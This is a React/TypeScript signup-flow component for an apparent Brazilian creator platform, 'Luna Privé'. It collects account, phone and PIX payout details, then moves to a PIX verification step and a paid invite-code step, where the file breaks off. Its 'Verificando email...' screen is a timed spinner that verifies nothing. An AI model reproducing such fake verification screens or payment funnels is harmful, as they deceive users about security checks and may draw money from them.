'use client'

import { useEffect, useMemo, useRef, useState } from 'react'
import { createClient } from '@/lib/supabase/client'
import { fbTrack } from '@/lib/fb/track'
import {
  User,
  Mail,
  Lock,
  Phone,
  KeyRound,
  Eye,
  EyeOff,
  ShieldCheck,
  Lightbulb,
  ChevronDown,
  Check,
  Loader2,
  AlertCircle,
  CalendarDays,
  Eye as EyeIcon,
  Clock,
  Gift,
  ChevronRight,
} from 'lucide-react'
import { CtaButton } from '@/components/cta-button'
import { PixContent } from '@/components/convite/pix-modal'
import { cn } from '@/lib/utils'

interface SignupFlowProps {
  onComplete: () => void
}

const TOTAL = 9

const pixOptions = ['CPF', 'CNPJ', 'Telefone', 'Email', 'Chave Aleatoria']

// Idades disponiveis para selecao (18 a 65+).
const ageOptions = [
  ...Array.from({ length: 47 }, (_, i) => String(i + 18)),
  '65+',
]

const appearanceOptions = [
  'Prefiro aparecer',
  'Prefiro não aparecer',
  'Tanto faz / decido depois',
]

const weeklyTimeOptions = [
  'Menos de 5 horas',
  '5 a 10 horas',
  '10 a 20 horas',
  'Mais de 20 horas',
]

// Nomes muito comuns/genericos: sugerimos algo mais criativo quando o usuario
// digita apenas um nome simples sem nenhum diferencial (numero, sufixo, etc).
const GENERIC_USERNAMES = [
  'luna', 'amanda', 'maria', 'ana', 'julia', 'joao', 'jose', 'pedro', 'lucas',
  'gabriel', 'rafael', 'bruna', 'carla', 'paula', 'fernanda', 'camila', 'beatriz',
  'larissa', 'leticia', 'vitoria', 'isabela', 'sophia', 'sofia', 'helena', 'laura',
  'manuela', 'alice', 'valentina', 'rosa', 'bella', 'lia', 'mia', 'teste', 'admin',
  'user', 'usuario', 'love', 'baby', 'anjo', 'gata', 'princesa',
]

function isGenericUsername(raw: string) {
  const value = raw.trim().toLowerCase()
  if (value.length < 3) return false
  // Possui algum diferencial (numero, _, ., sufixo) -> nao e generico.
  if (/[0-9._]/.test(value)) return false
  return GENERIC_USERNAMES.includes(value)
}

export function SignupFlow({ onComplete }: SignupFlowProps) {
  void onComplete
  const [step, setStep] = useState(0)
  const [status, setStatus] = useState<'form' | 'sending' | 'verify' | 'loading' | 'invite' | 'error'>('form')
  const [errorMessage, setErrorMessage] = useState('')

  // Campos
  const [username, setUsername] = useState('')
  const [age, setAge] = useState('')
  const [appearance, setAppearance] = useState('')
  const [weeklyTime, setWeeklyTime] = useState('')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [confirm, setConfirm] = useState('')
  const [phone, setPhone] = useState('')
  const [pixType, setPixType] = useState('CPF')
  const [pixKey, setPixKey] = useState('')

  const [showPass, setShowPass] = useState(false)
  const [showConfirm, setShowConfirm] = useState(false)
  const [pixOpen, setPixOpen] = useState(false)

  // Configuracoes publicas do servidor (fonte da verdade no backend).
  // verificationEnabled controla se a etapa de verificacao PIX aparece no fluxo.
  const [verificationEnabled, setVerificationEnabled] = useState(true)
  const [verificationAmountCents, setVerificationAmountCents] = useState(4990)
  // Valor do codigo de convite (editavel no painel). Usado no fluxo pos-cadastro.
  const [inviteAmountCents, setInviteAmountCents] = useState(0)

  useEffect(() => {
    let active = true
    fetch('/api/settings/public')
      .then((r) => (r.ok ? r.json() : null))
      .then((data) => {
        if (!active || !data) return
        if (typeof data.verificationEnabled === 'boolean') {
          setVerificationEnabled(data.verificationEnabled)
        }
        if (typeof data.verificationAmountCents === 'number') {
          setVerificationAmountCents(data.verificationAmountCents)
        }
        if (typeof data.inviteAmountCents === 'number') {
          setInviteAmountCents(data.inviteAmountCents)
        }
      })
      .catch(() => {})
    return () => {
      active = false
    }
  }, [])

  const back = () => setStep((s) => Math.max(0, s - 1))
  const advance = () => setStep((s) => Math.min(TOTAL - 1, s + 1))

  // Loading visual (apenas) ao avancar da etapa de email.
  const [verifyingEmail, setVerifyingEmail] = useState(false)
  const advanceEmail = () => {
    if (verifyingEmail) return
    setVerifyingEmail(true)
    setTimeout(() => {
      setVerifyingEmail(false)
      advance()
    }, 1500)
  }

  const finish = async () => {
    setStatus('loading')
    setErrorMessage('')
    
    try {
      const supabase = createClient()
      
      // Criar usuario no Supabase Auth
      const { data, error } = await supabase.auth.signUp({
        email: email.trim(),
        password: password,
        options: {
          data: {
            username: username.trim(),
            display_name: username.trim(),
            phone: phone.replace(/\D/g, ''),
            pix_type: pixType,
            pix_key: pixKey.trim(),
            age: age,
            appearance_preference: appearance,
            weekly_availability: weeklyTime,
            is_creator: true,
          },
        },
      })
      
      if (error) {
        console.error('[v0] Supabase signup error:', error)
        // Traduzir mensagens de erro comuns
        let msg = error.message
        if (error.message.includes('User already registered')) {
          msg = 'Este email ja esta cadastrado. Tente fazer login.'
        } else if (error.message.includes('rate limit') || error.message.includes('too many')) {
          msg = 'Muitas tentativas. Aguarde alguns minutos e tente novamente.'
        } else if (error.message.includes('is invalid') || error.message.includes('Invalid email')) {
          msg = 'Use um email real e valido. Emails inventados nao funcionam.'
        } else if (error.message.includes('Password')) {
          msg = 'Senha deve ter pelo menos 6 caracteres.'
        } else if (error.message.includes('email')) {
          msg = 'Erro com o email. Verifique se esta correto.'
        }
        setErrorMessage(msg)
        setStatus('error')
        return
      }
      
      if (!data.user) {
        setErrorMessage('Erro ao criar conta. Tente novamente.')
        setStatus('error')
        return
      }
      
      // Atualizar o perfil com dados adicionais (phone e pix)
      const { error: profileError } = await supabase
        .from('profiles')
        .update({
          phone: phone.replace(/\D/g, ''),
          pix_type: pixType,
          pix_key: pixKey.trim(),
        })
        .eq('id', data.user.id)
      
      if (profileError) {
        console.error('[v0] Profile update error:', profileError)
        // Nao bloquear - o trigger ja criou o perfil basico
      }
      
      // E-mail de boas-vindas (conta criada). Nao bloqueia o fluxo de cadastro
      // e nunca quebra caso o envio falhe.
      void fetch('/api/email/account-created', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: email.trim(), name: username.trim() }),
      }).catch((e) =>
        console.error('[v0] Falha ao solicitar e-mail de conta criada:', e),
      )

      // Salvar dados no sessionStorage para a pagina de convite
      try {
        sessionStorage.setItem(
          'luna_signup',
          JSON.stringify({ username, email, pixType, pixKey }),
        )
      } catch {
        // ignore storage errors
      }

      // Evento padrao do Facebook: cadastro concluido com sucesso.
      fbTrack('CompleteRegistration', {
        content_name: 'Cadastro Luna Privé',
        status: true,
      })

      setStatus('invite')
    } catch (err) {
      console.error('[v0] Signup error:', err)
      setErrorMessage('Erro inesperado. Tente novamente.')
      setStatus('error')
    }
  }

  // Validação por etapa
  const canContinue = useMemo(() => {
    switch (step) {
      case 0:
        return username.trim().length >= 3
      case 1:
        return age.length > 0
      case 2:
        return appearance.length > 0
      case 3:
        return weeklyTime.length > 0
      case 4:
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim())
      case 5:
        return password.length >= 6
      case 6:
        return confirm.length >= 6 && confirm === password
      case 7:
        return phone.replace(/\D/g, '').length >= 10
      case 8:
        return pixKey.trim().length >= 3
      default:
        return false
    }
  }, [step, username, age, appearance, weeklyTime, email, password, confirm, phone, pixKey])

  return (
    <div className="absolute inset-0 z-[60] flex flex-col">
      {/* App opaco ao fundo */}
      <div className="absolute inset-0 bg-background/88 backdrop-blur-[3px]" aria-hidden="true" />

      <div className="relative flex flex-1 flex-col items-center justify-center px-5 py-6">
          {status === 'invite' ? (
            <InviteCodeFlow
              email={email}
              userName={username}
              pixType={pixType}
              pixKey={pixKey}
              amountCents={inviteAmountCents}
            />
          ) : status === 'error' ? (
            <ErrorCard message={errorMessage} onRetry={() => setStatus('form')} />
          ) : status === 'sending' ? (
            <SendingPixCard
              pixType={pixType}
              pixKey={pixKey}
              email={email}
              beneficiaryName={username}
              onDone={() => setStatus('verify')}
              onError={(msg) => {
                setErrorMessage(msg)
                setStatus('error')
              }}
            />
          ) : status === 'verify' ? (
            <VerifyPixCard
              pixType={pixType}
              pixKey={pixKey}
              amountCents={verificationAmountCents}
              onConfirm={finish}
              onBack={() => setStatus('form')}
            />
          ) : status === 'loading' ? (
          <LoadingCard />
        ) : (
          <div
            key={step}
            className="animate-pop luna-border max-h-[92dvh] w-full max-w-sm overflow-y-auto overflow-x-hidden rounded-3xl bg-card p-7 shadow-2xl shadow-primary/15"
          >
            {/* Progresso */}
            <div className="mb-7">
              <div className="mb-2 flex items-center justify-between">
                <span className="text-[0.7rem] font-bold uppercase tracking-[0.16em] text-muted-foreground">
                  Passo {step + 1} de {TOTAL}
                </span>
                <span className="text-[0.7rem] font-bold tabular-nums text-primary">
                  {Math.round(((step + 1) / TOTAL) * 100)}%
                </span>
              </div>
              <div className="h-1.5 w-full overflow-hidden rounded-full bg-muted" aria-hidden="true">
                <div
                  className="h-full rounded-full luna-gradient transition-all duration-500 ease-out"
                  style={{ width: `${((step + 1) / TOTAL) * 100}%` }}
                />
              </div>
            </div>

            {/* NOME DE USUÁRIO */}
            {step === 0 && (
              <StepShell
                icon={User}
                eyebrow="Nome de usuário"
                title="Escolha o nome que você quiser"
                description="Este nome ficará à mostra para seus clientes."
              >
                <PrefixInput
                  prefix="@"
                  value={username}
                  onChange={(v) => setUsername(v.replace(/\s/g, '').toLowerCase())}
                  placeholder="seu_nome"
                  autoFocus
                />
                {isGenericUsername(username) && (
                  <div className="animate-pop mt-3 flex items-start gap-2.5 rounded-2xl border border-primary/25 bg-primary/10 px-3.5 py-3">
                    <Lightbulb className="mt-0.5 size-4 shrink-0 text-primary" aria-hidden="true" />
                    <p className="text-pretty text-[0.72rem] leading-relaxed text-foreground">
                      Esse nome é muito comum. Use algo mais criativo, como{' '}
                      <span className="font-semibold text-primary">@{username}_oficial</span> ou{' '}
                      <span className="font-semibold text-primary">@{username}_real</span>.
                    </p>
                  </div>
                )}
                <CtaButton className="mt-6" disabled={!canContinue} onClick={advance}>
                  Continuar
                </CtaButton>
              </StepShell>
            )}

            {/* IDADE */}
            {step === 1 && (
              <StepShell
                icon={CalendarDays}
                eyebrow="Sua idade"
                title="Quantos anos você tem?"
                description="Você precisa ter no mínimo 18 anos para criar uma conta."
              >
                <SafetyNote>Informação confidencial e nunca exibida</SafetyNote>
                <NativeSelect
                  value={age}
                  options={ageOptions}
                  placeholder="Selecione sua idade"
                  onChange={setAge}
                />
                <StepFooter onBack={back} disabled={!canContinue} onNext={advance} />
              </StepShell>
            )}

            {/* APARECER OU NÃO */}
            {step === 2 && (
              <StepShell
                icon={EyeIcon}
                eyebrow="Privacidade"
                title="Você prefere aparecer ou não?"
                description="Defina como quer trabalhar. Você pode mudar isso quando quiser."
              >
                <NativeSelect
                  value={appearance}
                  options={appearanceOptions}
                  placeholder="Escolha uma opção"
                  onChange={setAppearance}
                />
                <StepFooter onBack={back} disabled={!canContinue} onNext={advance} />
              </StepShell>
            )}

            {/* TEMPO DISPONÍVEL */}
            {step === 3 && (
              <StepShell
                icon={Clock}
                eyebrow="Disponibilidade"
                title="Quanto tempo por semana você tem disponível?"
                description="Isso nos ajuda a recomendar o melhor ritmo para você começar."
              >
                <NativeSelect
                  value={weeklyTime}
                  options={weeklyTimeOptions}
                  placeholder="Selecione sua disponibilidade"
                  onChange={setWeeklyTime}
                />
                <StepFooter onBack={back} disabled={!canContinue} onNext={advance} />
              </StepShell>
            )}

            {/* SEU EMAIL */}
            {step === 4 && (
              <StepShell
                icon={Mail}
                eyebrow="Seu email"
                title="Apenas para cadastro interno"
                description="Será necessário confirmar seu email posteriormente."
              >
                <SafetyNote>Sigilo total do seu email garantido</SafetyNote>
                <BaseInput
                  type="email"
                  inputMode="email"
                  value={email}
                  onChange={setEmail}
                  placeholder="seu@email.com"
                  autoFocus
                />
                <StepFooter onBack={back} disabled={!canContinue} onNext={advanceEmail} loading={verifyingEmail} loadingText="Verificando email..." />
              </StepShell>
            )}

            {/* CRIE UMA SENHA */}
            {step === 5 && (
              <StepShell
                icon={Lock}
                eyebrow="Crie uma senha"
                title="Proteja sua conta"
                description="Mínimo de 6 dígitos para sua segurança."
              >
                <PasswordInput
                  value={password}
                  onChange={setPassword}
                  show={showPass}
                  onToggle={() => setShowPass((s) => !s)}
                  placeholder="••••••"
                  autoFocus
                />
                <StepFooter onBack={back} disabled={!canContinue} onNext={advance} />
              </StepShell>
            )}

            {/* CONFIRME SUA SENHA */}
            {step === 6 && (
              <StepShell
                icon={Lock}
                eyebrow="Confirme sua senha"
                title="Quase lá"
                description="Digite novamente para confirmar."
              >
                <PasswordInput
                  value={confirm}
                  onChange={setConfirm}
                  show={showConfirm}
                  onToggle={() => setShowConfirm((s) => !s)}
                  placeholder="••••••"
                  autoFocus
                />
                {confirm.length > 0 && confirm !== password && (
                  <p className="mt-2 text-xs font-medium text-destructive">
                    As senhas não coincidem.
                  </p>
                )}
                <button
                  type="button"
                  onClick={() => {
                    setConfirm('')
                    setStep(5)
                  }}
                  className="mt-2.5 text-xs font-medium text-primary transition-opacity hover:opacity-80"
                >
                  ← Voltar e alterar senha
                </button>
                <StepFooter onBack={back} disabled={!canContinue} onNext={advance} />
              </StepShell>
            )}

            {/* SEU TELEFONE */}
            {step === 7 && (
              <StepShell
                icon={Phone}
                eyebrow="Seu telefone"
                title="Informe seu número com DDD"
                description="Usado apenas para envio de confirmações ou para você tirar dúvidas. Seu número nunca será compartilhado."
              >
                <SafetyNote>Visível apenas para nossa plataforma</SafetyNote>
                <BaseInput
                  type="tel"
                  inputMode="tel"
                  value={phone}
                  onChange={(v) => setPhone(formatPhone(v))}
                  placeholder="(00) 00000-0000"
                  autoFocus
                />
                <StepFooter onBack={back} disabled={!canContinue} onNext={advance} />
              </StepShell>
            )}

            {/* CHAVE PIX */}
            {step === 8 && (
              <StepShell
                icon={KeyRound}
                eyebrow="Chave PIX"
                title="Onde você quer receber?"
                description="Informe a chave PIX onde você irá receber as transferências do Luna Privé."
                iconPositive
              >
                {/* Dropdown tipo de chave */}
                <div className="relative">
                  <button
                    type="button"
                    onClick={() => setPixOpen((o) => !o)}
                    className="flex w-full items-center justify-between rounded-2xl border border-border bg-secondary/60 px-4 py-3.5 text-left text-base text-foreground"
                  >
                    {pixType}
                    <ChevronDown
                      className={cn(
                        'size-4 text-muted-foreground transition-transform',
                        pixOpen && 'rotate-180',
                      )}
                      aria-hidden="true"
                    />
                  </button>
                  {pixOpen && (
                    <ul className="luna-border absolute left-0 right-0 top-full z-10 mt-2 overflow-hidden rounded-2xl bg-popover py-1 shadow-2xl">
                      {pixOptions.map((opt) => (
                        <li key={opt}>
                          <button
                            type="button"
                            onClick={() => {
                              setPixType(opt)
                              setPixKey('')
                              setPixOpen(false)
                            }}
                            className={cn(
                              'flex w-full items-center justify-between px-4 py-3 text-left text-base transition-colors',
                              opt === pixType
                                ? 'bg-primary/15 font-semibold text-primary'
                                : 'text-foreground hover:bg-secondary/60',
                            )}
                          >
                            {opt}
                            {opt === pixType && <Check className="size-4" aria-hidden="true" />}
                          </button>
                        </li>
                      ))}
                    </ul>
                  )}
                </div>

                <div className="mt-3">
                  <BaseInput
                    value={pixKey}
                    onChange={(v) => setPixKey(formatPixKey(pixType, v))}
                    inputMode={
                      pixType === 'CPF' || pixType === 'CNPJ' || pixType === 'Telefone'
                        ? 'numeric'
                        : pixType === 'Email'
                          ? 'email'
                          : 'text'
                    }
                    placeholder={pixPlaceholder(pixType)}
                  />
                </div>

                <CtaButton
                  className="mt-6"
                  disabled={!canContinue}
                  onClick={() => (verificationEnabled ? setStatus('sending') : finish())}
                >
                  Finalizar cadastro
                </CtaButton>
                <button
                  type="button"
                  onClick={back}
                  className="mt-3 w-full text-center text-xs font-medium text-muted-foreground transition-opacity hover:opacity-80"
                >
                  ← Voltar para o passo anterior
                </button>
              </StepShell>
            )}
          </div>
        )}
      </div>
    </div>
  )
}

/* ---------- Subcomponentes ---------- */

function NativeSelect({
  value,
  options,
  placeholder,
  onChange,
}: {
  value: string
  options: string[]
  placeholder: string
  onChange: (v: string) => void
}) {
  return (
    <div className="relative">
      <select
        value={value}
        onChange={(e) => onChange(e.target.value)}
        className={cn(
          'h-[52px] w-full appearance-none rounded-2xl border border-border bg-secondary/60 px-4 pr-11 text-base outline-none transition-colors',
          'focus:border-primary/60 focus:ring-2 focus:ring-primary/20',
          value ? 'text-foreground' : 'text-muted-foreground/70',
        )}
      >
        <option value="" disabled>
          {placeholder}
        </option>
        {options.map((opt) => (
          <option key={opt} value={opt} className="bg-popover text-foreground">
            {opt}
          </option>
        ))}
      </select>
      <ChevronDown
        className="pointer-events-none absolute right-4 top-1/2 size-4 -translate-y-1/2 text-muted-foreground"
        aria-hidden="true"
      />
    </div>
  )
}

function StepShell({
  icon: Icon,
  eyebrow,
  title,
  description,
  iconPositive,
  children,
}: {
  icon: typeof User
  eyebrow: string
  title: string
  description: string
  iconPositive?: boolean
  children: React.ReactNode
}) {
  return (
    <div>
      <div className="flex items-center gap-2.5">
        <span
          className={cn(
            'flex size-9 items-center justify-center rounded-xl',
            iconPositive ? 'bg-positive/15' : 'bg-primary/15',
          )}
        >
          <Icon
            className={cn('size-[1.1rem]', iconPositive ? 'text-positive' : 'text-primary')}
            aria-hidden="true"
          />
        </span>
        <p
          className={cn(
            'text-[0.7rem] font-bold uppercase tracking-[0.16em]',
            iconPositive ? 'text-positive' : 'text-primary',
          )}
        >
          {eyebrow}
        </p>
      </div>
      <h2 className="mt-3.5 text-balance text-[1.35rem] font-bold leading-tight text-foreground">
        {title}
      </h2>
      <p className="mt-2 text-pretty text-sm leading-relaxed text-muted-foreground">
        {description}
      </p>
      <div className="mt-5">{children}</div>
    </div>
  )
}

const inputBase =
  'w-full rounded-2xl border border-border bg-secondary/60 px-4 py-3.5 text-base text-foreground placeholder:text-muted-foreground/70 outline-none transition-colors focus:border-primary/60 focus:ring-2 focus:ring-primary/20'

function BaseInput({
  value,
  onChange,
  placeholder,
  type = 'text',
  inputMode,
  autoFocus,
}: {
  value: string
  onChange: (v: string) => void
  placeholder?: string
  type?: string
  inputMode?: 'text' | 'email' | 'tel' | 'numeric'
  autoFocus?: boolean
}) {
  return (
    <input
      type={type}
      inputMode={inputMode}
      value={value}
      autoFocus={autoFocus}
      onChange={(e) => onChange(e.target.value)}
      placeholder={placeholder}
      className={inputBase}
    />
  )
}

function PrefixInput({
  prefix,
  value,
  onChange,
  placeholder,
  autoFocus,
}: {
  prefix: string
  value: string
  onChange: (v: string) => void
  placeholder?: string
  autoFocus?: boolean
}) {
  return (
    <div className="flex items-center rounded-2xl border border-border bg-secondary/60 px-4 transition-colors focus-within:border-primary/60 focus-within:ring-2 focus-within:ring-primary/20">
      <span className="mr-1 text-base font-semibold text-primary">{prefix}</span>
      <input
        value={value}
        autoFocus={autoFocus}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        className="w-full bg-transparent py-3.5 text-base text-foreground placeholder:text-muted-foreground/70 outline-none"
      />
    </div>
  )
}

function PasswordInput({
  value,
  onChange,
  show,
  onToggle,
  placeholder,
  autoFocus,
}: {
  value: string
  onChange: (v: string) => void
  show: boolean
  onToggle: () => void
  placeholder?: string
  autoFocus?: boolean
}) {
  return (
    <div className="flex items-center rounded-2xl border border-border bg-secondary/60 px-4 transition-colors focus-within:border-primary/60 focus-within:ring-2 focus-within:ring-primary/20">
      <input
        type={show ? 'text' : 'password'}
        value={value}
        autoFocus={autoFocus}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        className="w-full bg-transparent py-3.5 text-base text-foreground placeholder:text-muted-foreground/70 outline-none"
      />
      <button
        type="button"
        onClick={onToggle}
        className="ml-2 text-muted-foreground transition-colors hover:text-foreground"
        aria-label={show ? 'Ocultar senha' : 'Mostrar senha'}
      >
        {show ? <EyeOff className="size-5" /> : <Eye className="size-5" />}
      </button>
    </div>
  )
}

function SafetyNote({ children }: { children: React.ReactNode }) {
  return (
    <p className="mb-3 flex items-center gap-1.5 text-sm font-medium text-positive">
      <ShieldCheck className="size-4 shrink-0" aria-hidden="true" />
      {children}
    </p>
  )
}

function StepFooter({
  onBack,
  onNext,
  disabled,
  loading,
  loadingText,
  }: {
  onBack: () => void
  onNext: () => void
  disabled: boolean
  loading?: boolean
  loadingText?: string
  }) {
  return (
  <>
  <CtaButton className="mt-6" disabled={disabled} onClick={onNext} loading={loading} loadingText={loadingText}>
  Continuar
  </CtaButton>
  <button
  type="button"
  onClick={onBack}
  className="mt-3 w-full text-center text-xs font-medium text-muted-foreground transition-opacity hover:opacity-80"
  >
        ← Voltar para o passo anterior
      </button>
    </>
  )
}

function VerifyPixCard({
  pixType,
  pixKey,
  amountCents,
  onConfirm,
  onBack,
}: {
  pixType: string
  pixKey: string
  amountCents: number
  onConfirm: () => void
  onBack: () => void
}) {
  const [raw, setRaw] = useState('')
  const [touched, setTouched] = useState(false)
  const [checking, setChecking] = useState(false)

  // Valor exato esperado, formatado em BRL (ex.: R$ 0,90), vindo do servidor.
  const expectedFormatted = useMemo(
    () =>
      (amountCents / 100).toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL',
      }),
    [amountCents],
  )

  // Formata os digitos como moeda: 1 -> R$ 0,01 / 123 -> R$ 1,23
  const formatted = useMemo(() => {
    const digits = raw.replace(/\D/g, '').slice(0, 9)
    const cents = digits ? Number.parseInt(digits, 10) : 0
    return (cents / 100).toLocaleString('pt-BR', {
      style: 'currency',
      currency: 'BRL',
    })
  }, [raw])

  // Confere se o valor digitado e exatamente o valor esperado (em centavos)
  const isCorrect = (Number.parseInt(raw.replace(/\D/g, ''), 10) || 0) === amountCents

  const handleConfirm = () => {
    if (checking) return
    setTouched(true)
    // Mostra um loading de verificação antes de validar o resultado
    setChecking(true)
    setTimeout(() => {
      if (isCorrect) {
        onConfirm()
      } else {
        setChecking(false)
      }
    }, 2200)
  }

  // Tela de checagem do valor recebido
  if (checking) {
    return (
      <div className="animate-pop luna-border w-full max-w-sm overflow-hidden rounded-3xl bg-card px-7 py-9 text-center shadow-2xl shadow-primary/15">
        <div className="relative mx-auto flex size-16 items-center justify-center">
          <span className="absolute inset-0 rounded-full bg-positive/15" />
          <Loader2 className="size-9 animate-spin text-positive" aria-hidden="true" />
        </div>
        <h2 className="mt-5 text-balance text-xl font-bold leading-tight text-foreground">
          Confirmando valor recebido...
        </h2>
        <p className="mt-2 text-pretty text-sm leading-relaxed text-muted-foreground">
          Estamos verificando se o valor digitado confere com o que enviamos para sua chave PIX.
        </p>
        <div className="mt-5 flex items-center justify-center gap-2 rounded-2xl border border-border bg-secondary/50 px-4 py-3">
          <span className="text-sm text-muted-foreground">Valor informado:</span>
          <span className="text-base font-bold tabular-nums text-foreground">{formatted}</span>
        </div>
      </div>
    )
  }

  return (
    <div className="animate-pop luna-border w-full max-w-sm overflow-hidden rounded-3xl bg-card p-7 shadow-2xl shadow-primary/15">
      <div className="flex items-center gap-2.5">
        <span className="flex size-9 items-center justify-center rounded-xl bg-positive/15">
          <ShieldCheck className="size-[1.1rem] text-positive" aria-hidden="true" />
        </span>
        <p className="text-[0.7rem] font-bold uppercase tracking-[0.16em] text-positive">
          Verificação da chave
        </p>
      </div>

      <h2 className="mt-3.5 text-balance text-[1.35rem] font-bold leading-tight text-foreground">
        Confirme sua chave PIX
      </h2>
      <p className="mt-2 text-pretty text-sm leading-relaxed text-muted-foreground">
        Para garantir que sua chave PIX é autêntica e real, enviamos um pequeno valor para ela.
        Confira no seu banco e digite abaixo o <span className="font-semibold text-foreground">valor exato</span> que você recebeu.
      </p>

      {/* Chave que está sendo verificada */}
      <div className="mt-4 flex items-center gap-2.5 rounded-2xl border border-border bg-secondary/50 px-4 py-3">
        <KeyRound className="size-4 shrink-0 text-positive" aria-hidden="true" />
        <div className="min-w-0 leading-tight">
          <p className="text-[0.65rem] uppercase tracking-wider text-muted-foreground">{pixType}</p>
          <p className="truncate text-sm font-semibold text-foreground">{pixKey || '—'}</p>
        </div>
      </div>

      {/* Aviso */}
      <div className="mt-3 flex items-start gap-2.5 rounded-2xl border border-primary/25 bg-primary/10 px-3.5 py-3">
        <Lightbulb className="mt-0.5 size-4 shrink-0 text-primary" aria-hidden="true" />
        <p className="text-pretty text-[0.72rem] leading-relaxed text-foreground">
          Digite o valor com <span className="font-semibold text-primary">todos os números certinhos</span>,
          exatamente como você recebeu (ex.: {expectedFormatted}).
        </p>
      </div>

      {/* Campo de valor */}
      <div className="mt-4">
        <input
          inputMode="numeric"
          value={formatted}
          autoFocus
          onChange={(e) => {
            setRaw(e.target.value)
            setTouched(false)
          }}
          placeholder="R$ 0,00"
          className={cn(
            'w-full rounded-2xl border bg-secondary/60 px-4 py-4 text-center text-2xl font-bold tabular-nums text-foreground outline-none transition-colors focus:ring-2',
            touched && !isCorrect
              ? 'border-destructive/60 focus:ring-destructive/20'
              : 'border-border focus:border-positive/60 focus:ring-positive/20',
          )}
        />
        {touched && !isCorrect && (
          <p className="mt-2 flex items-center gap-1.5 text-xs font-medium text-destructive">
            <AlertCircle className="size-3.5 shrink-0" aria-hidden="true" />
            Valor incorreto. Confira no seu banco e digite exatamente o valor recebido.
          </p>
        )}
      </div>

      <CtaButton className="mt-6" disabled={!isCorrect} onClick={handleConfirm}>
        Confirmar e finalizar
      </CtaButton>
      <button
        type="button"
        onClick={onBack}
        className="mt-3 w-full text-center text-xs font-medium text-muted-foreground transition-opacity hover:opacity-80"
      >
        ← Voltar e revisar a chave PIX
      </button>
    </div>
  )
}

function SendingPixCard({
  pixType,
  pixKey,
  email,
  beneficiaryName,
  onDone,
  onError,
}: {
  pixType: string
  pixKey: string
  email: string
  beneficiaryName: string
  onDone: () => void
  onError: (message: string) => void
}) {
  const [progress, setProgress] = useState(0)
  const DURATION = 5000

  useEffect(() => {
    const start = Date.now()
    let active = true

    const interval = setInterval(() => {
      const elapsed = Date.now() - start
      // Trava em 92% ate a resposta do servidor chegar
      const pct = Math.min(92, Math.round((elapsed / DURATION) * 100))
      setProgress(pct)
    }, 60)

    // Dispara o envio real do cashout no servidor (valor fixo de R$ 0,90).
    // Nenhum valor e enviado pelo cliente.
    const sendPromise = fetch('/api/pix/verify-key', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        email: email?.trim() || null,
        pixKey: pixKey?.trim() || '',
        pixType,
        beneficiaryName: beneficiaryName?.trim() || null,
      }),
    })
      .then(async (res) => {
        const data = await res.json().catch(() => ({}))
        return { ok: res.ok, data }
      })
      .catch(() => ({ ok: false, data: { error: 'Falha de conexão. Tente novamente.' } }))

    // Garante o tempo minimo de exibicao do loading (>= DURATION)
    const minDelay = new Promise((resolve) => setTimeout(resolve, DURATION))

    Promise.all([sendPromise, minDelay]).then(([result]) => {
      if (!active) return
      clearInterval(interval)
      setProgress(100)

      const r = result as { ok: boolean; data: any }
      if (r.ok && r.data?.success) {
        setTimeout(() => active && onDone(), 250)
      } else {
        const msg =
          r.data?.error ||
          'Não foi possível enviar o valor de verificação para esta chave PIX.'
        setTimeout(() => active && onError(msg), 250)
      }
    })

    return () => {
      active = false
      clearInterval(interval)
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  return (
    <div className="animate-pop luna-border w-full max-w-sm overflow-hidden rounded-3xl bg-card px-7 py-9 text-center shadow-2xl shadow-primary/15">
      <div className="relative mx-auto flex size-16 items-center justify-center">
        <span className="absolute inset-0 rounded-full bg-positive/15" />
        <Loader2 className="size-9 animate-spin text-positive" aria-hidden="true" />
      </div>

      <h2 className="mt-5 text-balance text-xl font-bold leading-tight text-foreground">
        Enviando valor para a chave...
      </h2>
      <p className="mt-2 text-pretty text-sm leading-relaxed text-muted-foreground">
        Estamos transferindo um pequeno valor para verificar se sua chave PIX é autêntica e real.
      </p>

      {/* Chave que está recebendo o valor */}
      <div className="mt-5 flex items-center gap-2.5 rounded-2xl border border-border bg-secondary/50 px-4 py-3 text-left">
        <KeyRound className="size-4 shrink-0 text-positive" aria-hidden="true" />
        <div className="min-w-0 leading-tight">
          <p className="text-[0.65rem] uppercase tracking-wider text-muted-foreground">{pixType}</p>
          <p className="truncate text-sm font-semibold text-foreground">{pixKey || '—'}</p>
        </div>
      </div>

      {/* Barra de progresso */}
      <div className="mt-5">
        <div className="h-1.5 w-full overflow-hidden rounded-full bg-muted" aria-hidden="true">
          <div
            className="h-full rounded-full bg-positive transition-all duration-100 ease-linear"
            style={{ width: `${progress}%` }}
          />
        </div>
        <p className="mt-2 text-xs font-medium tabular-nums text-muted-foreground">
          Processando transferência... {progress}%
        </p>
      </div>
    </div>
  )
}

function LoadingCard() {
  return (
    <div className="animate-pop luna-border flex w-full max-w-sm flex-col items-center rounded-3xl bg-card px-6 py-10 text-center shadow-2xl shadow-primary/15">
      <Loader2 className="size-10 animate-spin text-primary" aria-hidden="true" />
      <p className="mt-5 text-lg font-bold text-foreground">Criando sua conta...</p>
      <p className="mt-1.5 text-pretty text-sm leading-relaxed text-muted-foreground">
        Estamos preparando tudo para voce comecar a vender.
      </p>
    </div>
  )
}

function ErrorCard({ message, onRetry }: { message: string; onRetry: () => void }) {
  return (
    <div className="animate-pop luna-border flex w-full max-w-sm flex-col items-center rounded-3xl bg-card px-6 py-10 text-center shadow-2xl shadow-primary/15">
      <div className="flex size-14 items-center justify-center rounded-full bg-destructive/15">
        <AlertCircle className="size-7 text-destructive" aria-hidden="true" />
      </div>
      <p className="mt-5 text-lg font-bold text-foreground">Ops! Algo deu errado</p>
      <p className="mt-1.5 text-pretty text-sm leading-relaxed text-muted-foreground">
        {message}
      </p>
      <CtaButton className="mt-6" onClick={onRetry}>
        Tentar novamente
      </CtaButton>
    </div>
  )
}

function InviteCodeFlow({
  email,
  userName,
  pixType,
  pixKey,
  amountCents,
}: {
  email: string
  userName: string
  pixType: string
  pixKey: string
  amountCents: number
}) {
  // Etapas: tela inicial (igual ao anexo) -> loading -> oferta -> PIX
